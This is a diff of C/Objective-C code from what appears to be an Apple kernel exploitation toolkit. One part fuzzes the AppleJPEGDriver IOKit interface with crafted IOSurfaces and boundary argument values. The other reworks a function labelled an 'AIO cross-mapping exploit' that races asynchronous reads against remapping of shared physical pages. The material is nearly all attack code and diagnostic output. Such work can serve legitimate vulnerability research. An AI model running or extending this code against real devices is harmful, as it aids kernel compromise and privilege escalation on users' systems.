@@ -501,81 +501,91 @@ static kern_return_t call_jpeg_method(uint32_t method, void *input, size_t input
     return kr;
 }
 
+// Create IOSurface with specific pixel format for JPEG driver
+static IOSurfaceRef create_jpeg_surface(uint32_t width, uint32_t height, uint32_t pixelFormat) {
+    uint32_t bpr = (width * 4 + 15) & ~15; // 16-byte aligned row stride
+    uint32_t alloc = bpr * height;
+    NSDictionary *params = @{
+        (__bridge id)kIOSurfaceAllocSize : @(alloc),
+        (__bridge id)kIOSurfaceWidth : @(width),
+        (__bridge id)kIOSurfaceHeight : @(height),
+        (__bridge id)kIOSurfaceBytesPerRow : @(bpr),
+        (__bridge id)kIOSurfacePixelFormat : @(pixelFormat),
+        (__bridge id)kIOSurfaceBytesPerElement : @(4),
+    };
+    return IOSurfaceCreate((__bridge CFDictionaryRef)params);
+}
+
 static void method_apple_jpeg_fuzz(void) {
     printf("\n[Method: JPEG_fuzz] Fuzzing AppleJPEGDriver...\n");
     if (!open_apple_jpeg()) { printf("[JPEG] Cannot open driver\n"); return; }
 
-    // Method 0: setSurface — takes two IOSurface IDs
-    printf("[JPEG] Trying method 0 (setSurface)...\n");
-    {
-        uint64_t args[3] = {0, 0, 0}; // inputSurfaceID, outputSurfaceID, flags
-        size_t outSz = 0;
-        kern_return_t kr = call_jpeg_method(0, args, sizeof(args), NULL, &outSz);
-        printf("[JPEG] method 0 (null surfaces): kr=%#x\n", kr);
-    }
+    // Try setSurface with properly configured IOSurfaces at various sizes
+    const uint32_t formats[] = {
+        0x34323066, // '420f' — 420YpCbCr8BiPlanarVideoRange (YpCbCr)
+        0x34323076, // '420v' — 420YpCbCr8BiPlanarFullRange
+        0x42475241, // 'ARGB'
+        0x42475241, // 'BGRA'
+    };
+    const uint32_t sizes[][2] = {
+        {1920, 1080}, {1280, 720}, {640, 480}, {320, 240},
+        {256, 256}, {128, 128}, {64, 64}, {32, 32},
+    };
 
-    // Method 1: decode — needs surface set first
-    printf("[JPEG] Trying method 1 (decode)...\n");
-    {
-        uint64_t args[4] = {0, 0, 0, 0}; // srcOff, dstOff, size, flags
-        size_t outSz = 0;
-        kern_return_t kr = call_jpeg_method(1, args, sizeof(args), NULL, &outSz);
-        printf("[JPEG] method 1 (decode, no surface): kr=%#x\n", kr);
-    }
+    for (int f = 0; f < sizeof(formats)/sizeof(formats[0]); f++) {
+        for (int s = 0; s < sizeof(sizes)/sizeof(sizes[0]); s++) {
+            IOSurfaceRef sf = create_jpeg_surface(sizes[s][0], sizes[s][1], formats[f]);
+            if (!sf) { printf("[JPEG] surf %x %dx%d: create failed\n", formats[f], sizes[s][0], sizes[s][1]); continue; }
 
-    // Method 2: encode
-    printf("[JPEG] Trying method 2 (encode)...\n");
-    {
-        uint64_t args[5] = {0, 0, 0, 0, 100}; // srcOff, dstOff, size, flags, quality
-        size_t outSz = 0;
-        kern_return_t kr = call_jpeg_method(2, args, sizeof(args), NULL, &outSz);
-        printf("[JPEG] method 2 (encode, no surface): kr=%#x\n", kr);
-    }
-
-    // Fuzz methods 3-15 with various inputs
-    for (uint32_t m = 3; m <= 15; m++) {
-        uint64_t args[8] = {0};
-        size_t outSz = sizeof(uint64_t) * 4;
-        uint64_t output[4];
-        // Try with different argument patterns
-        for (int pat = 0; pat < 3; pat++) {
-            memset(args, 0, sizeof(args));
-            switch (pat) {
-                case 0: args[0] = 0xFFFFFFFFFFFFFFFFULL; break;
-                case 1: args[0] = 0x1000; args[1] = 0x1000; break;
-                case 2: args[0] = (uint64_t)-1; break;
+            uint32_t sid = IOSurfaceGetID(sf);
+            uint64_t args[3] = {sid, sid, 0};
+            kern_return_t kr = call_jpeg_method(0, args, sizeof(args), NULL, NULL);
+            if (kr == KERN_SUCCESS) {
+                printf("[JPEG] setSurface OK: fmt=%#x %dx%d sid=%u\n", formats[f], sizes[s][0], sizes[s][1], sid);
+                // Try decode with this surface
+                uint64_t decArgs[4] = {0, 0, (uint64_t)sizes[s][0] * sizes[s][1] * 4, 0};
+                kr = call_jpeg_method(1, decArgs, sizeof(decArgs), NULL, NULL);
+                printf("[JPEG] decode: kr=%#x\n", kr);
+                // Try encode
+                uint64_t encArgs[5] = {0, 0, (uint64_t)sizes[s][0] * sizes[s][1] * 4, 0, 90};
+                kr = call_jpeg_method(2, encArgs, sizeof(encArgs), NULL, NULL);
+                printf("[JPEG] encode: kr=%#x\n", kr);
             }
-            outSz = sizeof(output);
-            kern_return_t kr = IOConnectCallMethod(gJpegConn, m,
-                args, 2, NULL, 0, output, (uint32_t*)&outSz, NULL, NULL);
-            if (kr != KERN_SUCCESS && kr != 0x2C) // ignore not-supported and timeout
-                printf("[JPEG] method %d (pat %d): kr=%#x (outSz=%zu)\n", m, pat, kr, outSz);
+            CFRelease(sf);
         }
     }
 
-    // IOSurface-backed test: create IOSurface, pass its ID to setSurface
-    printf("[JPEG] Testing with real IOSurface...\n");
-    NSDictionary *sfParams = @{
-        (__bridge id)kIOSurfaceAllocSize : @(PAGE_SIZE),
-        (__bridge id)kIOSurfaceWidth : @(64),
-        (__bridge id)kIOSurfaceHeight : @(64),
-        (__bridge id)kIOSurfaceBytesPerRow : @(256),
-        (__bridge id)kIOSurfacePixelFormat : @(0x42475241), // 'ARGB'
-    };
-    IOSurfaceRef testSurface = IOSurfaceCreate((__bridge CFDictionaryRef)sfParams);
-    if (testSurface) {
-        uint32_t surfID = IOSurfaceGetID(testSurface);
-        printf("[JPEG] test IOSurface ID=%u\n", surfID);
-        uint64_t surfArgs[3] = {surfID, surfID, 0};
-        kern_return_t kr = call_jpeg_method(0, surfArgs, sizeof(surfArgs), NULL, NULL);
-        printf("[JPEG] setSurface (same ID for in/out): kr=%#x\n", kr);
+    // Also try calling each method (0-15) with a connected surface
+    IOSurfaceRef testSurf = create_jpeg_surface(640, 480, 0x34323066);
+    if (testSurf) {
+        uint32_t sid = IOSurfaceGetID(testSurf);
+        uint64_t setArgs[3] = {sid, sid, 0};
+        call_jpeg_method(0, setArgs, sizeof(setArgs), NULL, NULL);
 
-        // Now try decode with valid surface
-        uint64_t decArgs[4] = {0, 0, PAGE_SIZE, 0};
-        kr = call_jpeg_method(1, decArgs, sizeof(decArgs), NULL, NULL);
-        printf("[JPEG] decode with surface: kr=%#x\n", kr);
-
-        CFRelease(testSurface);
+        for (uint32_t m = 0; m <= 15; m++) {
+            uint64_t args[8] = {0};
+            size_t outSz = 32;
+            uint64_t output[4];
+            for (int pat = 0; pat < 4; pat++) {
+                memset(args, 0, sizeof(args));
+                switch (pat) {
+                    case 0: args[0] = 0; args[1] = 0x1000; args[2] = 0x1000; break;
+                    case 1: args[0] = 0xFFFFFFFFFFFFFFFFULL; break;
+                    case 2: args[0] = 0; args[1] = 0; args[2] = 0; args[3] = 0; break;
+                    case 3: args[0] = (uint64_t)-1; args[1] = 0x1000; break;
+                }
+                outSz = sizeof(output);
+                kern_return_t kr = IOConnectCallMethod(gJpegConn, m,
+                    args, 4, NULL, 0, output, (uint32_t*)&outSz, NULL, NULL);
+                if (kr != KERN_SUCCESS && m <= 2)
+                    printf("[JPEG] method %d (pat %d): kr=%#x\n", m, pat, kr);
+                else if (kr != KERN_SUCCESS && m >= 3 && pat == 0)
+                    printf("[JPEG] method %d: kr=%#x\n", m, kr);
+                else if (kr == KERN_SUCCESS)
+                    printf("[JPEG] method %d (pat %d): SUCCESS kr=0 outSz=%zu\n", m, pat, outSz);
+            }
+        }
+        CFRelease(testSurf);
     }
 
     IOServiceClose(gJpegConn);
@@ -650,13 +660,11 @@ static bool method_system_memory(void) {
     return hits > 0;
 }
 
-// Method 2: AIO cross-mapping exploit — uses shared physical pages
-// Two memory entries from the same IOSurface → same physical pages at different VAs
-// aio_read into VA_A while reading result from VA_B
+// Method 2: AIO cross-mapping exploit — uses shared physical pages + FILE (not pipe)
+// aio_read from a file into shared pages (dual memory entries)
 static bool method_aio_exploit(void) {
-    printf("\n[Method: AIO_Exploit] Testing AIO with dual mappings...\n");
+    printf("\n[Method: AIO_Exploit] Testing AIO with dual mappings + file...\n");
 
-    // Step 1: Create IOSurface (PurpleGfxMem for physically contiguous)
     mach_vm_size_t pgSz = 16 * PAGE_SIZE;
     NSDictionary *params = @{
         (__bridge id)kIOSurfaceAllocSize : @(pgSz),
@@ -668,7 +676,7 @@ static bool method_aio_exploit(void) {
     void *physBase = IOSurfaceGetBaseAddress(surface);
     printf("[AIO_Exploit] IOSurface physBase=%p\n", physBase);
 
-    // Step 2: Create TWO memory entries from the same pages
+    // Two memory entries from same physical pages
     mach_port_t entry1 = MACH_PORT_NULL, entry2 = MACH_PORT_NULL;
     mach_vm_size_t meSz = pgSz;
     kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &meSz,
@@ -679,7 +687,7 @@ static bool method_aio_exploit(void) {
         (mach_vm_address_t)physBase, VM_PROT_DEFAULT, &entry2, 0);
     if (kr != KERN_SUCCESS) { printf("[AIO_Exploit] entry2: %s\n", mach_error_string(kr)); mach_port_deallocate(mach_task_self_, entry1); CFRelease(surface); return false; }
 
-    // Step 3: Map both entries at different user addresses
+    // Map at two different VAs
     mach_vm_address_t vaA = 0, vaB = 0;
     kr = mach_vm_map(mach_task_self(), &vaA, pgSz, 0,
         VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, entry1, 0, 0,
@@ -691,92 +699,102 @@ static bool method_aio_exploit(void) {
         VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
     if (kr != KERN_SUCCESS) { printf("[AIO_Exploit] map B: %s\n", mach_error_string(kr)); mach_vm_deallocate(mach_task_self_, vaA, pgSz); goto cleanup; }
 
-    printf("[AIO_Exploit] vaA=0x%llx vaB=0x%llx (same physical pages)\n", vaA, vaB);
+    printf("[AIO_Exploit] vaA=0x%llx vaB=0x%llx\n", vaA, vaB);
 
-    // Step 4: Fill with marker via VA_A
+    // Fill with marker
     memset64((void*)vaA, 0xAA, pgSz);
 
-    // Step 5: Create a pipe for aio_read
-    int pipefd[2];
-    if (pipe(pipefd) != 0) { printf("[AIO_Exploit] pipe failed\n"); goto cleanup; }
+    // Create a temp file for AIO
+    char tmpPath[1024];
+    confstr(_CS_DARWIN_USER_TEMP_DIR, tmpPath, 1024);
+    char fn[64]; snprintf(fn, 64, "/aio_%u", arc4random());
+    strlcat(tmpPath, fn, 1024);
+    {
+        void *z = calloc(1, 0x10000);
+        FILE *f = fopen(tmpPath, "w"); fwrite(z, 1, 0x10000, f); fclose(f);
+        free(z);
+    }
+    int fd = open(tmpPath, O_RDWR);
+    fcntl(fd, F_NOCACHE, 1);
+    remove(tmpPath);
 
-    // Write test data to pipe
-    uint8_t pipeData[0x100];
-    for (int i = 0; i < sizeof(pipeData); i++) pipeData[i] = i;
-    write(pipefd[1], pipeData, sizeof(pipeData));
+    // Write test data to the file (at non-zero offset to verify aio_read position)
+    uint8_t fileData[0x100];
+    for (int i = 0; i < sizeof(fileData); i++) fileData[i] = 0xBB;
+    pwrite(fd, fileData, sizeof(fileData), 0);
 
-    // Step 6: Submit aio_read from pipe into VA_B
+    // Test 1: Basic aio_read from file into shared VA_B — verify cross-mapping works
+    printf("[AIO_Exploit] Test 1: aio_read from file into VA_B...\n");
     struct aiocb aio;
     memset(&aio, 0, sizeof(aio));
-    aio.aio_fildes = pipefd[0];
-    aio.aio_buf = (void*)(vaB + 0x1000);  // Write to middle of shared pages
+    aio.aio_fildes = fd;
+    aio.aio_buf = (void*)(vaB + 0x1000);
     aio.aio_nbytes = 0x100;
+    aio.aio_offset = 0;
     aio.aio_sigevent.sigev_notify = SIGEV_NONE;
 
     kr = aio_read(&aio);
     printf("[AIO_Exploit] aio_read=%d (errno=%d)\n", kr, errno);
+    if (kr != 0) { printf("[AIO_Exploit] aio_read failed, aborting\n"); close(fd); goto cleanup; }
 
-    // Step 7: While AIO is in-flight, change VA_B mapping through VA_A
-    // Both share same physical pages — write through VA_A
-    uint64_t *testWords = (uint64_t*)(vaB + 0x1000);
-    printf("[AIO_Exploit] Before aio_suspend: *(vaB+0x1000)=0x%llx\n", *testWords);
-
-    // Wait for completion
     const struct aiocb *list[1] = {&aio};
     aio_suspend(list, 1, NULL);
     kr = aio_error(&aio);
     size_t n = aio_return(&aio);
     printf("[AIO_Exploit] aio_error=%d aio_return=%zu\n", kr, n);
 
-    // Read via VA_A (same physical pages) to verify cross-mapping read
-    uint8_t *verify = (uint8_t*)(vaA + 0x1000);
-    printf("[AIO_Exploit] Via VA_A: %02x %02x %02x %02x...\n",
-           verify[0], verify[1], verify[2], verify[3]);
-    printf("[AIO_Exploit] Via VA_B: %02x %02x %02x %02x...\n",
-           ((uint8_t*)(vaB + 0x1000))[0], ((uint8_t*)(vaB + 0x1000))[1],
-           ((uint8_t*)(vaB + 0x1000))[2], ((uint8_t*)(vaB + 0x1000))[3]);
+    // Check if data arrived via VA_A (same physical pages)
+    uint8_t *viaA = (uint8_t*)(vaA + 0x1000);
+    uint8_t *viaB = (uint8_t*)(vaB + 0x1000);
+    printf("[AIO_Exploit] Via VA_A: %02x %02x %02x %02x (%s marker)\n",
+           viaA[0], viaA[1], viaA[2], viaA[3],
+           viaA[0] == 0xBB ? "OK" : "MISMATCH");
+    printf("[AIO_Exploit] Via VA_B: %02x %02x %02x %02x\n",
+           viaB[0], viaB[1], viaB[2], viaB[3]);
 
-    // Step 8: Try the race — deallocate VA_B during aio_read, remap to different entry
+    // Test 2: aio_read with REMAP during I/O
+    printf("[AIO_Exploit] Test 2: aio_write with remap during I/O...\n");
+
+    // Write different data to file
+    pwrite(fd, fileData, sizeof(fileData), 0x2000);
+    fileData[0] = 0xCC;
+    pwrite(fd, fileData, sizeof(fileData), 0x2000);
+
     memset(&aio, 0, sizeof(aio));
-    aio.aio_fildes = pipefd[0];
+    aio.aio_fildes = fd;
     aio.aio_buf = (void*)(vaB + 0x2000);
     aio.aio_nbytes = 0x100;
+    aio.aio_offset = 0x2000;
     aio.aio_sigevent.sigev_notify = SIGEV_NONE;
 
-    // Write new data to pipe
-    uint8_t pipeData2[0x100];
-    for (int i = 0; i < sizeof(pipeData2); i++) pipeData2[i] = 0xFF - i;
-    write(pipefd[1], pipeData2, sizeof(pipeData2));
+    // Fill target with marker first
+    memset64((void*)(vaB + 0x2000), 0xDD, 0x100);
 
     kr = aio_read(&aio);
-    printf("[AIO_Exploit] Race aio_read=%d\n", kr);
+    printf("[AIO_Exploit] aio_read(test2)=%d\n", kr);
 
-    // During read, remap vaA to point to different IOStream offset
-    // Then check if the data appears at the old or new location
-    mach_vm_address_t oldVaA = vaA;
-    mach_vm_deallocate(mach_task_self_, vaA, pgSz);
-    kr = mach_vm_map(mach_task_self_, &vaA, pgSz, 0,
-        VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, entry1, 0, 0,
+    // During I/O, deallocate and remap vaB to different entry
+    mach_vm_address_t oldVaB = vaB;
+    // Remap: change pages backing vaB
+    mach_vm_deallocate(mach_task_self_, vaB, pgSz);
+    kr = mach_vm_map(mach_task_self_, &vaB, pgSz, 0,
+        VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, entry2, 0, 0,
         VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
-    printf("[AIO_Exploit] remapped vaA, kr=%d\n", kr);
+    printf("[AIO_Exploit] remapped vaB, kr=%d\n", kr);
 
     aio_suspend(list, 1, NULL);
     kr = aio_error(&aio);
     n = aio_return(&aio);
-    printf("[AIO_Exploit] Race: aio_error=%d aio_return=%zu\n", kr, n);
+    printf("[AIO_Exploit] Test2: aio_error=%d aio_return=%zu\n", kr, n);
 
-    uint8_t bufA[0x100], bufB[0x100];
-    memcpy(bufA, (void*)(vaA + 0x2000), 0x100);
-    memcpy(bufB, (void*)(vaB + 0x2000), 0x100);
+    // Read results — data should be at the remapped location
+    uint8_t *viaA2 = (uint8_t*)(vaA + 0x2000);
+    uint8_t *viaB2 = (uint8_t*)(vaB + 0x2000);
+    printf("[AIO_Exploit] Test2 via VA_A: %02x %02x...\n", viaA2[0], viaA2[1]);
+    printf("[AIO_Exploit] Test2 via VA_B: %02x %02x...\n", viaB2[0], viaB2[1]);
+    printf("[AIO_Exploit] Test2 VA_A=0x%02x (orig marker=0xDD, file=0xCC)\n", viaA2[0]);
 
-    printf("[AIO_Exploit] Race read via VA_A: %02x %02x...\n", bufA[0], bufA[1]);
-    printf("[AIO_Exploit] Race read via VA_B: %02x %02x...\n", bufB[0], bufB[1]);
-
-    bool match = (memcmp(bufA, bufB, 0x100) == 0);
-    printf("[AIO_Exploit] VA_A == VA_B: %d\n", match);
-
-    // Cleanup
-    close(pipefd[0]); close(pipefd[1]);
+    close(fd);
     mach_vm_deallocate(mach_task_self_, vaA, pgSz);
     mach_vm_deallocate(mach_task_self_, vaB, pgSz);
 
